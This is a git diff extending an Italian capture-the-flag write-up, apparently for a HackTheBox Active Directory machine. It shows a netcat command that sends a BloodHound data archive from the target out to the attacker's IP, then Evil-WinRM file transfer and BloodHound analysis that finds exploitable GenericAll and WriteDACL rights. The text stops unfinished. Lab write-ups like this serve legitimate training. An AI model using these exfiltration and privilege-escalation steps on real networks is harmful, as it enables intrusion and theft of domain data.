@@ -60,4 +60,17 @@ Con la stessa tecnica di prima carico dentro la macchina NetCat, quindi passo ve
 .\nc.exe -w 3 IP 9191 | 20200317113311_BloodHound.zip
 ```
 
+A quanto pare il file .zip trasferito con NetCat risulta essere corrotto. Cercando un altro metodo per trasferire il file ho scoperto che Evil-WinRM contiene già due metodi "DOWNLOAD" e "UPLOAD". Ho usato questi per spostare l'archivio zip generato. A questo punto ho trascinato il file zip su BloodHound (assicurati che il DB sia in running con "sudo neo4j console" altrimenti non funzionerà), ho messo come nodo foglia 
+```
+SVC-ALFRESCO@HTB.LOCAL
+```
+e come nodo radice 
+```
+DOMAIN ADINS@HTB.LOCAL
+```
 
+Osservo l'albero dell'ActiveDirectory e scopro che l'utente ha di base due permessi ereditati (per errore?): 
+* GenericAll
+* WriteDACL
+
+Li sfrutto per ? 
